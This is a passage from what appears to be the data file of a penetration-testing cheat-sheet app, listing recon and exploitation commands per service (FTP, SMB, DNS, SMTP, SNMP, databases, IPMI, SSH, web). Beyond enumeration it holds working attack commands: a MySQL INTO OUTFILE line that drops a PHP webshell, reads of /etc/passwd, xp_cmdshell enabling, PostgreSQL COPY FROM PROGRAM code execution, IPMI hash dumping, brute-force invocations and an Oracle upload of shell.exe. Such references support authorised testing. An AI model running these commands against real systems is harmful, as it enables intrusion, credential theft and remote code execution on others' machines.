          { id: 'fpi6', label: 'Wayback Machine URLs', os: 'Linux', command: 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.$$DOMAIN/*&output=text&fl=original&collapse=urlkey" | sort -u', notes: 'Historical URLs — may reveal old endpoints.' },
        ],
      },
      {
        id: 'fp-ftp',
        name: 'FTP (Port 21)',
        description: 'Enumerate FTP service: version, anonymous login, file listing, and config disclosure.',
        tags: ['ftp', 'enumeration', 'protocol'],
                subtechniques: [
          {
            id: "ftp-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "ftp1", label: "Nmap FTP scripts", os: "Linux", command: "nmap -sV -sC -p 21 $$IP", notes: "Banner grab and default scripts (anon login, bounce, etc.)." },
            { id: "ftp2", label: "Anonymous login test", os: "Linux", command: "ftp $$IP\nusername: anonymous\npassword: anonymous", notes: "Try anonymous:anonymous or anonymous:<blank>." },
            { id: "ftp3", label: "List files (anon)", os: "Linux", command: "ftp -n $$IP <<EOF\nquote USER anonymous\nquote PASS anonymous\nls -la\nEOF", notes: "Non-interactive anonymous FTP listing." }
            ]
          },
          {
            id: "ftp-exp",
            name: "Exploitation & Brute",
            commands: [
            { id: "ftp4", label: "Download all files (wget)", os: "Linux", command: "wget -m --no-passive ftp://anonymous:anonymous@$$IP/", notes: "Mirror the entire FTP site locally." },
            { id: "ftp5", label: "Banner grab (nc)", os: "Linux", command: "nc -nv $$IP 21", notes: "Raw banner — reveals vsftpd/ProFTPD/etc version." },
            { id: "ftp6", label: "Brute force FTP (hydra)", os: "Linux", command: "hydra -l $$USER -P $$WORDLIST ftp://$$IP", notes: "" },
            { id: "ftp7", label: "NSE scripts (all)", os: "Linux", command: "nmap --script ftp-* -p 21 $$IP", notes: "Run all FTP NSE scripts." }
            ]
          }
        ],
      },
      {
        id: 'fp-smb',
        name: 'SMB (Ports 445/139)',
        description: 'Enumerate SMB: OS, shares, users, sessions, and vulnerabilities.',
        tags: ['smb', 'windows', 'enumeration'],
                subtechniques: [
          {
            id: "fsmb-disc",
            name: "Discovery & Recon",
            commands: [
            { id: "fsmb1", label: "Nmap SMB scripts", os: "Linux", command: "nmap -sV -sC -p 445 $$IP", notes: "" },
            { id: "fsmb2", label: "SMB version / OS", os: "Linux", command: "nmap --script smb-os-discovery -p 445 $$IP", notes: "" },
            { id: "fsmb3", label: "SMB vuln check", os: "Linux", command: "nmap --script smb-vuln* -p 445 $$IP", notes: "Check EternalBlue (MS17-010) and others." },
            { id: "fsmb4", label: "List shares (anonymous)", os: "Linux", command: "smbclient -L //$$IP/ -N", notes: "-N = no password / null session." }
            ]
          },
          {
            id: "fsmb-shr",
            name: "Share Enumeration",
            commands: [
            { id: "fsmb5", label: "enum4linux-ng", os: "Linux", command: "enum4linux-ng -A $$IP", notes: "Full enumeration: users, shares, policies, groups." },
            { id: "fsmb6", label: "List shares (CME)", os: "Linux", command: "crackmapexec smb $$IP --shares -u \"\" -p \"\"", notes: "" },
            { id: "fsmb7", label: "Connect to share", os: "Linux", command: "smbclient //$$IP/$$SHARE -U $$USER%$$PASSWORD", notes: "" },
            { id: "fsmb8", label: "Spider share (CME)", os: "Linux", command: "crackmapexec smb $$IP -u $$USER -p $$PASSWORD -M spider_plus", notes: "Recursively list all files on all shares." },
            { id: "fsmb9", label: "SMBMap", os: "Linux", command: "smbmap -H $$IP -u $$USER -p $$PASSWORD -R", notes: "Map share permissions recursively." }
            ]
          }
        ],
      },
      {
        id: 'fp-nfs',
        name: 'NFS (Port 2049)',
        description: 'Enumerate and mount NFS exports to access files on the target.',
        tags: ['nfs', 'linux', 'enumeration'],
        commands: [
          { id: 'nfs1', label: 'Nmap NFS scripts', os: 'Linux', command: 'nmap -sV -sC -p 111,2049 $$IP', notes: '' },
          { id: 'nfs2', label: 'Show NFS exports', os: 'Linux', command: 'showmount -e $$IP', notes: 'Lists all exported directories and allowed clients.' },
          { id: 'nfs3', label: 'Mount NFS share', os: 'Linux', command: 'sudo mount -t nfs $$IP:/<export> /mnt/nfs -nolock', notes: 'Mount exported share locally.' },
          { id: 'nfs4', label: 'NSE NFS scripts', os: 'Linux', command: 'nmap --script nfs* -p 111,2049 $$IP', notes: 'nfs-ls, nfs-showmount, nfs-statfs.' },
          { id: 'nfs5', label: 'Unmount', os: 'Linux', command: 'sudo umount /mnt/nfs', notes: '' },
        ],
      },
      {
        id: 'fp-dns',
        name: 'DNS (Port 53)',
        description: 'Enumerate DNS: record types, zone transfers, subdomain brute-forcing.',
        tags: ['dns', 'enumeration', 'network'],
                subtechniques: [
          {
            id: "dns-basic",
            name: "Basic Queries",
            commands: [
            { id: "dns1", label: "NS records", os: "Linux", command: "dig NS $$DOMAIN", notes: "Find authoritative nameservers." },
            { id: "dns2", label: "MX records", os: "Linux", command: "dig MX $$DOMAIN", notes: "Mail exchange servers." },
            { id: "dns3", label: "All record types", os: "Linux", command: "dig ANY $$DOMAIN @$$IP", notes: "Query all record types from a specific nameserver." }
            ]
          },
          {
            id: "dns-zone",
            name: "Zone Transfer & Brute",
            commands: [
            { id: "dns4", label: "Zone transfer (dig)", os: "Linux", command: "dig axfr $$DOMAIN @$$IP", notes: "Attempt a full zone transfer. Often blocked but worth trying." },
            { id: "dns5", label: "Zone transfer (nslookup)", os: "Any", command: "nslookup -type=any -query=AXFR $$DOMAIN $$IP", notes: "" },
            { id: "dns6", label: "Subdomain brute (dnsenum)", os: "Linux", command: "dnsenum --dnsserver $$IP --enum -p 0 -s 0 -o subdomains.txt -f $$WORDLIST $$DOMAIN", notes: "" },
            { id: "dns7", label: "Subdomain brute (dnsrecon)", os: "Linux", command: "dnsrecon -d $$DOMAIN -D $$WORDLIST -t brt", notes: "" },
            { id: "dns8", label: "Reverse lookup PTR", os: "Linux", command: "dig -x $$IP @$$IP", notes: "PTR record for an IP." }
            ]
          }
        ],
      },
      {
        id: 'fp-smtp',
        name: 'SMTP (Port 25/587/465)',
        description: 'Enumerate SMTP: banner, supported commands, user enumeration via VRFY/EXPN/RCPT.',
        tags: ['smtp', 'email', 'enumeration'],
                subtechniques: [
          {
            id: "smtp-disc",
            name: "Recon & Banner",
            commands: [
            { id: "smtp1", label: "Nmap SMTP scripts", os: "Linux", command: "nmap -sV -sC -p 25,587,465 $$IP", notes: "" },
            { id: "smtp2", label: "Banner grab + EHLO", os: "Linux", command: "telnet $$IP 25\nEHLO pentest", notes: "See supported extensions and server identity." }
            ]
          },
          {
            id: "smtp-usr",
            name: "User Enum & Relay",
            commands: [
            { id: "smtp3", label: "User enum (VRFY)", os: "Linux", command: "smtp-user-enum -M VRFY -U $$WORDLIST -t $$IP", notes: "VRFY checks if a user exists." },
            { id: "smtp4", label: "User enum (RCPT TO)", os: "Linux", command: "smtp-user-enum -M RCPT -U users.txt -D $$DOMAIN -t $$IP", notes: "RCPT TO based user enumeration." },
            { id: "smtp5", label: "EXPN command", os: "Linux", command: "telnet $$IP 25\nEXPN all", notes: "Expand mailing lists — may reveal valid users." },
            { id: "smtp6", label: "Open relay test", os: "Linux", command: "nmap --script smtp-open-relay -p 25 $$IP", notes: "Check if server can relay mail to external domains." },
            { id: "smtp7", label: "Send test email", os: "Linux", command: "swaks --to target@$$DOMAIN --from attacker@evil.com --server $$IP", notes: "Test if relay is open via swaks." }
            ]
          }
        ],
      },
      {
        id: 'fp-imap',
        name: 'IMAP / POP3 (Ports 143/110/993/995)',
        description: 'Enumerate IMAP/POP3: banner, capabilities, authentication, and mailbox listing.',
        tags: ['imap', 'pop3', 'email', 'enumeration'],
                subtechniques: [
          {
            id: "imap-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "imap1", label: "Nmap IMAP/POP3 scripts", os: "Linux", command: "nmap -sV -sC -p 110,143,993,995 $$IP", notes: "" },
            { id: "imap2", label: "Banner grab IMAP (nc)", os: "Linux", command: "nc -nv $$IP 143", notes: "See server greeting and version." },
            { id: "imap3", label: "IMAP capabilities", os: "Linux", command: "curl -k \"imap://$$IP\" --user \"$$USER:$$PASSWORD\" -v 2>&1 | head -20", notes: "" }
            ]
          },
          {
            id: "imap-mail",
            name: "Mail Access",
            commands: [
            { id: "imap4", label: "List IMAP mailboxes", os: "Linux", command: "curl -k \"imap://$$IP\" --user \"$$USER:$$PASSWORD\" --request \"LIST \"\" \"*\"\" -v", notes: "List all mailboxes for the user." },
            { id: "imap5", label: "Fetch email (IMAP)", os: "Linux", command: "curl -k \"imap://$$IP/INBOX;MAILINDEX=1\" --user \"$$USER:$$PASSWORD\"", notes: "Download first message from INBOX." },
            { id: "imap6", label: "POP3 login + list", os: "Linux", command: "telnet $$IP 110\nUSER $$USER\nPASS $$PASSWORD\nLIST", notes: "List messages via POP3." },
            { id: "imap7", label: "SSL IMAP (openssl)", os: "Linux", command: "openssl s_client -connect $$IP:993", notes: "Connect to IMAPS port." }
            ]
          }
        ],
      },
      {
        id: 'fp-snmp',
        name: 'SNMP (Port 161 UDP)',
        description: 'Enumerate SNMP community strings and MIB data: users, processes, network interfaces, installed software.',
        tags: ['snmp', 'udp', 'enumeration', 'network'],
                subtechniques: [
          {
            id: "snmp-scan",
            name: "Scan & Walk",
            commands: [
            { id: "snmp1", label: "Nmap SNMP scripts", os: "Linux", command: "nmap -sU -sV -p 161 $$IP --script snmp*", notes: "UDP scan — requires root." },
            { id: "snmp2", label: "Community string brute (onesixtyone)", os: "Linux", command: "onesixtyone -c $$WORDLIST $$IP", notes: "Brute-force community strings." },
            { id: "snmp3", label: "Full MIB walk (snmpwalk)", os: "Linux", command: "snmpwalk -v2c -c public $$IP", notes: "Dump entire MIB tree with \"public\" community." },
            { id: "snmp4", label: "System info OID", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.1", notes: "sysDescr, sysUpTime, sysContact, sysName." }
            ]
          },
          {
            id: "snmp-enum",
            name: "Detailed Enumeration",
            commands: [
            { id: "snmp5", label: "Enumerate users (Windows)", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.4.1.77.1.2.25", notes: "Windows user accounts via SNMP." },
            { id: "snmp6", label: "Enumerate processes", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.25.4.2.1.2", notes: "Running processes on the target." },
            { id: "snmp7", label: "Enumerate open TCP ports", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.6.13.1.3", notes: "Open TCP connections via SNMP." },
            { id: "snmp8", label: "Installed software", os: "Linux", command: "snmpwalk -v2c -c public $$IP 1.3.6.1.2.1.25.6.3.1.2", notes: "Installed programs list (Windows)." },
            { id: "snmp9", label: "braa (bulk walk)", os: "Linux", command: "braa public@$$IP:.1.3.6.*", notes: "Fast bulk SNMP walk." }
            ]
          }
        ],
      },
      {
        id: 'fp-mysql',
        name: 'MySQL (Port 3306)',
        description: 'Fingerprint and enumerate MySQL: version, users, databases, tables, columns, and file read/write capabilities.',
        tags: ['mysql', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "mysql-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "mysql1", label: "Nmap MySQL scripts", os: "Linux", command: "nmap -sV -sC -p 3306 $$IP --script mysql*", notes: "Detects version, auth methods, empty root password, databases." },
            { id: "mysql2", label: "Banner grab (nc)", os: "Linux", command: "nc -nv $$IP 3306", notes: "Grab raw MySQL banner — shows version and capabilities." },
            { id: "mysql3", label: "Connect (authenticated)", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD", notes: "Password immediately after -p (no space)." },
            { id: "mysql4", label: "Anonymous / empty root check", os: "Linux", command: "mysql -h $$IP -u root --password=\"\" -e \"SELECT user,host FROM mysql.user;\"\nmysql -h $$IP -u \"\" --password=\"\" -e \"SHOW DATABASES;\"", notes: "Common misconfiguration — root with no password." }
            ]
          },
          {
            id: "mysql-enum",
            name: "Enumeration",
            commands: [
            { id: "mysql5", label: "Version & current context", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT version(), user(), database(), @@datadir;\"", notes: "" },
            { id: "mysql6", label: "List databases", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SHOW DATABASES;\"", notes: "" },
            { id: "mysql7", label: "List tables", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"USE $$DB_NAME; SHOW TABLES;\"", notes: "" },
            { id: "mysql8", label: "Describe table columns", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"DESCRIBE $$DB_NAME.$$DB_TABLE;\"", notes: "Shows column names, types, and keys." }
            ]
          },
          {
            id: "mysql-exp",
            name: "Exploitation",
            commands: [
            { id: "mysql9", label: "Dump user hashes", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT user,host,authentication_string FROM mysql.user;\"", notes: "Requires access to mysql.user — crack hashes with hashcat mode 3200." },
            { id: "mysql10", label: "Check file privileges", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE';\"", notes: "FILE privilege required for LOAD_FILE and SELECT INTO OUTFILE." },
            { id: "mysql11", label: "Read file (LOAD_FILE)", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT LOAD_FILE('/etc/passwd');\"", notes: "Requires FILE privilege and file must be world-readable." },
            { id: "mysql12", label: "Write file (INTO OUTFILE)", os: "Linux", command: "mysql -h $$IP -u $$USER -p$$PASSWORD -e \"SELECT '<?php system(\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\"", notes: "Requires FILE privilege and write access to web root. Drops a webshell." },
            { id: "mysql13", label: "Brute force (hydra)", os: "Linux", command: "hydra -L users.txt -P $$WORDLIST $$IP mysql", notes: "" },
            { id: "mysql14", label: "Nmap brute", os: "Linux", command: "nmap -p 3306 $$IP --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'fp-mssql',
        name: 'MSSQL (Port 1433)',
        description: 'Fingerprint and enumerate Microsoft SQL Server: version, databases, tables, linked servers, and xp_cmdshell status.',
        tags: ['mssql', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "mssql-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "mssql1", label: "Nmap MSSQL scripts", os: "Linux", command: "nmap -sV -sC -p 1433 $$IP --script ms-sql*", notes: "ms-sql-info, ms-sql-config, ms-sql-empty-password, ms-sql-ntlm-info." },
            { id: "mssql2", label: "Connect (mssqlclient.py)", os: "Linux", command: "mssqlclient.py $$USER:$$PASSWORD@$$IP\nmssqlclient.py $$DOMAIN/$$USER:$$PASSWORD@$$IP -windows-auth", notes: "Second form uses Windows/AD authentication instead of SQL auth." },
            { id: "mssql3", label: "Connect (sqsh / sqlcmd)", os: "Linux", command: "sqsh -S $$IP -U $$USER -P $$PASSWORD\nsqlcmd -S $$IP -U $$USER -P $$PASSWORD -Q \"SELECT @@VERSION\"", notes: "sqsh = Linux MSSQL client. sqlcmd = Windows built-in client." },
            { id: "mssql4", label: "Version & server info", os: "Both", command: "SELECT @@VERSION\nSELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('Edition'), @@SERVICENAME", notes: "" },
            { id: "mssql5", label: "List databases", os: "Both", command: "SELECT name,create_date,state_desc FROM sys.databases\nSELECT name FROM master..sysdatabases", notes: "" }
            ]
          },
          {
            id: "mssql-enum",
            name: "Enumeration",
            commands: [
            { id: "mssql6", label: "List tables in DB", os: "Both", command: "SELECT TABLE_NAME FROM $$DB_NAME.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'\nSELECT name FROM $$DB_NAME..sysobjects WHERE xtype='U'", notes: "" },
            { id: "mssql7", label: "List columns in table", os: "Both", command: "SELECT COLUMN_NAME,DATA_TYPE FROM $$DB_NAME.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='$$DB_TABLE'\nSELECT name,TYPE_NAME(system_type_id) FROM $$DB_NAME..syscolumns WHERE id=OBJECT_ID('$$DB_NAME..$$DB_TABLE')", notes: "" },
            { id: "mssql8", label: "Check current user & role", os: "Both", command: "SELECT SYSTEM_USER, USER_NAME()\nSELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT IS_SRVROLEMEMBER('bulkadmin')", notes: "1 = member of that role. sysadmin = full control." },
            { id: "mssql9", label: "List DB users & roles", os: "Both", command: "SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE type IN ('S','U','G')\nEXEC sp_helplogins", notes: "" },
            { id: "mssql10", label: "Check xp_cmdshell status", os: "Both", command: "SELECT value FROM sys.configurations WHERE name='xp_cmdshell'\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell'", notes: "value=1 = already enabled. Requires sysadmin to enable." }
            ]
          },
          {
            id: "mssql-exp",
            name: "Exploitation",
            commands: [
            { id: "mssql11", label: "Enable & run xp_cmdshell", os: "Both", command: "EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami'", notes: "Requires sysadmin. Use via mssqlclient.py enable_xp_cmdshell → xp_cmdshell whoami." },
            { id: "mssql12", label: "Read file (OPENROWSET)", os: "Both", command: "SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS contents\nSELECT BulkColumn FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_BLOB) x", notes: "Requires ADMINISTER BULK OPERATIONS or sysadmin." },
            { id: "mssql13", label: "List linked servers", os: "Both", command: "SELECT name,data_source,provider FROM sys.servers WHERE is_linked=1\nEXEC sp_linkedservers\nSELECT * FROM OPENQUERY(\"<linked-server>\", 'SELECT SYSTEM_USER')", notes: "Linked servers may have higher privileges — pivot via OPENQUERY or EXEC AT." },
            { id: "mssql14", label: "Brute force (hydra)", os: "Linux", command: "hydra -L users.txt -P passwords.txt $$IP mssql", notes: "" },
            { id: "mssql15", label: "Nmap MSSQL brute", os: "Linux", command: "nmap -p 1433 $$IP --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'fp-postgres',
        name: 'PostgreSQL (Port 5432)',
        description: 'Fingerprint and enumerate PostgreSQL: version, databases, schemas, tables, user roles, and file read/RCE via COPY.',
        tags: ['postgresql', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "pg-disc",
            name: "Discovery & Auth",
            commands: [
            { id: "pg1", label: "Nmap PostgreSQL scripts", os: "Linux", command: "nmap -sV -sC -p 5432 $$IP --script pgsql*", notes: "" },
            { id: "pg2", label: "Connect (psql)", os: "Linux", command: "psql -h $$IP -U $$USER -d $$DB_NAME\npsql -h $$IP -U postgres", notes: "Default admin user = postgres. Default DB = postgres." },
            { id: "pg3", label: "Version & current context", os: "Both", command: "SELECT version();\nSELECT current_user, session_user, current_database();\nSELECT inet_server_addr(), inet_server_port();", notes: "" },
            { id: "pg4", label: "List databases", os: "Both", command: "SELECT datname FROM pg_database;\n\\l", notes: "\\l is the psql meta-command shortcut." }
            ]
          },
          {
            id: "pg-enum",
            name: "Enumeration",
            commands: [
            { id: "pg5", label: "List tables (current schema)", os: "Both", command: "SELECT table_name FROM information_schema.tables WHERE table_schema='public';\n\\dt", notes: "" },
            { id: "pg6", label: "Describe table columns", os: "Both", command: "SELECT column_name,data_type FROM information_schema.columns WHERE table_name='$$DB_TABLE';\n\\d $$DB_TABLE", notes: "" },
            { id: "pg7", label: "List users & roles", os: "Both", command: "SELECT rolname,rolsuper,rolcreatedb,rolcreaterole,rolcanlogin FROM pg_roles;\n\\du", notes: "rolsuper=t = superuser (equivalent to root)." },
            { id: "pg8", label: "Check superuser status", os: "Both", command: "SELECT current_user, (SELECT rolsuper FROM pg_roles WHERE rolname=current_user);\nSELECT pg_has_role(current_user,'pg_execute_server_program','MEMBER');", notes: "pg_execute_server_program role allows COPY FROM PROGRAM (RCE)." }
            ]
          },
          {
            id: "pg-exp",
            name: "Exploitation",
            commands: [
            { id: "pg9", label: "Read file (COPY TO STDOUT)", os: "Both", command: "COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';\nCREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;", notes: "COPY FROM reads file into a temp table. Requires superuser or pg_read_server_files role." },
            { id: "pg10", label: "RCE via COPY FROM PROGRAM", os: "Both", command: "COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';\nCREATE TABLE cmd_output(output TEXT);\nCOPY cmd_output FROM PROGRAM 'id';\nSELECT * FROM cmd_output;", notes: "CVE-2019-9193 (PostgreSQL ≥9.3). Requires superuser or pg_execute_server_program role." },
            { id: "pg11", label: "UDF-based RCE", os: "Linux", command: "# 1. Compile PostgreSQL UDF shared library\ngcc -shared -fPIC -o udf.so udf.c -I$(pg_config --includedir-server)\n# 2. Load via COPY and CREATE FUNCTION\nCOPY udf_binary TO '/tmp/udf.so';\nCREATE FUNCTION sys_exec(text) RETURNS text AS '/tmp/udf.so','sys_exec' LANGUAGE C;", notes: "For restricted PostgreSQL — drop a custom shared library as a UDF." },
            { id: "pg12", label: "Brute force (hydra)", os: "Linux", command: "hydra -L users.txt -P passwords.txt $$IP postgres", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'fp-oracle',
        name: 'Oracle TNS (Port 1521)',
        description: 'Enumerate Oracle database service: SID brute-forcing, user enumeration, and code execution via ODAT.',
        tags: ['oracle', 'database', 'enumeration'],
                subtechniques: [
          {
            id: "ora-disc",
            name: "Discovery & Brute",
            commands: [
            { id: "ora1", label: "Nmap Oracle scripts", os: "Linux", command: "nmap -sV -sC -p 1521 $$IP --script oracle*", notes: "" },
            { id: "ora2", label: "SID brute (odat)", os: "Linux", command: "odat sidguesser -s $$IP -p 1521", notes: "Brute-force Oracle SID names." },
            { id: "ora3", label: "Password brute (odat)", os: "Linux", command: "odat passwordguesser -s $$IP -p 1521 -d <SID> --accounts-file accounts.txt", notes: "" },
            { id: "ora4", label: "All ODAT checks", os: "Linux", command: "odat all -s $$IP -p 1521 -d <SID> -U $$USER -P $$PASSWORD", notes: "Run all ODAT enumeration and exploitation modules." }
            ]
          },
          {
            id: "ora-acc",
            name: "Access & Enum",
            commands: [
            { id: "ora5", label: "SQLPlus login", os: "Linux", command: "sqlplus $$USER/$$PASSWORD@$$IP/XE", notes: "Connect via Oracle SQLPlus client. XE = SID." },
            { id: "ora6", label: "List users", os: "Linux", command: "sqlplus $$USER/$$PASSWORD@$$IP/XE\nSELECT username FROM all_users ORDER BY username;", notes: "" },
            { id: "ora7", label: "File upload (odat utlfile)", os: "Linux", command: "odat utlfile -s $$IP -d <SID> -U $$USER -P $$PASSWORD --putFile /tmp shell.exe shell.exe", notes: "Upload file to server via UTL_FILE." }
            ]
          }
        ],
      },
      {
        id: 'fp-ipmi',
        name: 'IPMI (Port 623 UDP)',
        description: 'Enumerate IPMI/BMC: version, authentication bypass, and credential extraction.',
        tags: ['ipmi', 'bmc', 'udp', 'enumeration'],
                subtechniques: [
          {
            id: "ipmi-scan",
            name: "Discovery & Scan",
            commands: [
            { id: "ipmi1", label: "Nmap IPMI scan", os: "Linux", command: "nmap -sU --script ipmi-version -p 623 $$IP", notes: "Detect IPMI and get version info." },
            { id: "ipmi2", label: "ipmitool version", os: "Linux", command: "ipmitool -I lanplus -H $$IP -U \"\" -P \"\" mc info", notes: "Get BMC info — may work without creds." }
            ]
          },
          {
            id: "ipmi-hash",
            name: "Hash Extraction & Attack",
            commands: [
            { id: "ipmi3", label: "IPMI hash dump (Metasploit)", os: "Linux", command: "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $$IP; run\"", notes: "Dumps HMAC-SHA1 hashes — crack offline for plain text." },
            { id: "ipmi4", label: "Crack IPMI hash", os: "Linux", command: "hashcat -m 7300 ipmi.txt $$WORDLIST", notes: "Mode 7300 = IPMI2 RAKP HMAC-SHA1." },
            { id: "ipmi5", label: "IPMI default creds", os: "Linux", command: "ipmitool -I lanplus -H $$IP -U admin -P admin chassis status", notes: "Try vendor defaults: admin/admin, admin/password, root/calvin (Dell)." },
            { id: "ipmi6", label: "IPMI cipher zero bypass", os: "Linux", command: "ipmitool -I lanplus -H $$IP -U $$USER -P \"\" -C 0 mc info", notes: "Cipher 0 = no auth. Many older BMCs accept it." }
            ]
          }
        ],
      },
      {
        id: 'fp-win-remote',
        name: 'Windows Remote Management',
        description: 'Enumerate Windows remote management protocols: RDP, WinRM, WMI, and RPC.',
        tags: ['windows', 'rdp', 'winrm', 'wmi', 'enumeration'],
                subtechniques: [
          {
            id: "wrm-rdp",
            name: "RDP & WinRM",
            commands: [
            { id: "wrm1", label: "Nmap RDP scripts", os: "Linux", command: "nmap -sV -sC -p 3389 $$IP --script rdp*", notes: "" },
            { id: "wrm2", label: "RDP NLA check", os: "Linux", command: "nmap --script rdp-enum-encryption -p 3389 $$IP", notes: "Check if NLA is required." },
            { id: "wrm3", label: "WinRM check (CME)", os: "Linux", command: "crackmapexec winrm $$IP -u $$USER -p $$PASSWORD", notes: "Verify WinRM access (port 5985/5986)." },
            { id: "wrm4", label: "WMI query (wmiexec)", os: "Linux", command: "wmiexec.py $$DOMAIN/$$USER:$$PASSWORD@$$IP \"hostname\"", notes: "" }
            ]
          },
          {
            id: "wrm-rpc",
            name: "RPC & WMI",
            commands: [
            { id: "wrm5", label: "RPC enumeration", os: "Linux", command: "rpcclient -U \"$$USER%$$PASSWORD\" $$IP", notes: "Interactive RPC client for AD/SMB enumeration." },
            { id: "wrm6", label: "RPC enumdomusers", os: "Linux", command: "rpcclient -U \"\" $$IP -c \"enumdomusers\" -N", notes: "Anonymous user enumeration via RPC." },
            { id: "wrm7", label: "Nmap WinRM", os: "Linux", command: "nmap -sV -p 5985,5986 $$IP", notes: "Detect WinRM (HTTP=5985, HTTPS=5986)." }
            ]
          }
        ],
      },
      {
        id: 'fp-linux-remote',
        name: 'Linux Remote Management',
        description: 'Enumerate Linux remote management: SSH, Rsync, and legacy R-services (rlogin/rsh/rexec).',
        tags: ['linux', 'ssh', 'rsync', 'enumeration'],
                subtechniques: [
          {
            id: "lrm-ssh",
            name: "SSH",
            commands: [
            { id: "lrm1", label: "Nmap SSH scripts", os: "Linux", command: "nmap -sV -sC -p 22 $$IP --script ssh*", notes: "Banner, host-key, auth methods." },
            { id: "lrm2", label: "SSH auth methods", os: "Linux", command: "ssh -v $$USER@$$IP 2>&1 | grep \"Authentications that can continue\"", notes: "Which methods does the server allow?" },
            { id: "lrm3", label: "SSH public key audit", os: "Linux", command: "ssh-audit $$IP", notes: "Check for weak ciphers, kex algorithms, host key types." },
            { id: "lrm4", label: "SSH brute (hydra)", os: "Linux", command: "hydra -l $$USER -P $$WORDLIST ssh://$$IP", notes: "" }
            ]
          },
          {
            id: "lrm-rsync",
            name: "Rsync",
            commands: [
            { id: "lrm5", label: "Rsync list modules", os: "Linux", command: "rsync --list-only rsync://$$IP/", notes: "List available Rsync modules (shares)." },
            { id: "lrm6", label: "Rsync list contents", os: "Linux", command: "rsync --list-only rsync://$$IP/<module>/", notes: "List files in a Rsync module." },
            { id: "lrm7", label: "Rsync download", os: "Linux", command: "rsync -av rsync://$$IP/<module>/ /tmp/rsync-loot/", notes: "Download all files from a Rsync share." }
            ]
          },
          {
            id: "lrm-rsvc",
            name: "R-Services",
            commands: [
            { id: "lrm8", label: "R-services check", os: "Linux", command: "nmap -sV -p 512,513,514 $$IP", notes: "Ports: 512=rexec, 513=rlogin, 514=rsh. Legacy — often misconfigured." },
            { id: "lrm9", label: "Rlogin (if .rhosts exists)", os: "Linux", command: "rlogin -l root $$IP", notes: "If /root/.rhosts has \"+ +\" it grants passwordless access." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 16. Web App Testing ─────────────────────────────────────────────────── */
  {
    id: 'webapp',
    name: 'Web App Testing',
    icon: '🌐',
    techniques: [
      {
        id: 'web-recon',
        name: 'Recon & Discovery',
        description: 'Map the attack surface: directories, parameters, technologies, and WAF detection.',
        tags: ['web', 'recon'],
                subtechniques: [
          {
            id: "wr-dir",
            name: "Directory Brute",
            commands: [
            { id: "wr1", label: "ffuf directory brute", os: "Linux", command: "ffuf -u http://$$IP/FUZZ -w $$WORDLIST -mc 200,301,302,403 -t 50", notes: "" },
            { id: "wr2", label: "feroxbuster recursive", os: "Linux", command: "feroxbuster -u http://$$IP -w $$WORDLIST -x php,html,txt --depth 3", notes: "Auto-recursive directory scanning." }
            ]
          },
          {
            id: "wr-fp",
            name: "Fingerprint & Scan",
            commands: [
            { id: "wr3", label: "whatweb fingerprint", os: "Linux", command: "whatweb -a 3 http://$$IP", notes: "Identify web stack, CMS, and server version." },
            { id: "wr4", label: "WAF detection", os: "Linux", command: "wafw00f http://$$IP", notes: "Detect and identify WAF products." },
            { id: "wr5", label: "Arjun parameter discovery", os: "Linux", command: "arjun -u http://$$IP/page.php", notes: "Discovers hidden GET/POST parameters." },
            { id: "wr6", label: "nuclei scan", os: "Linux", command: "nuclei -u http://$$IP -t /root/nuclei-templates/ -severity medium,high,critical", notes: "Template-based vulnerability scanner." },
            { id: "wr7", label: "Google dorks", os: "Both", command: "site:$$DOMAIN ext:php OR ext:asp OR ext:aspx OR ext:jsp\nsite:$$DOMAIN inurl:admin OR inurl:login OR inurl:dashboard\nsite:$$DOMAIN \"index of /\"", notes: "Paste into Google to find exposed endpoints." }
            ]
          }
        ],
      },
      {
        id: 'web-sqli-detect',
        name: 'SQLi — Detection & Fingerprinting',
        description: 'Identify injection points and determine the database engine type.',
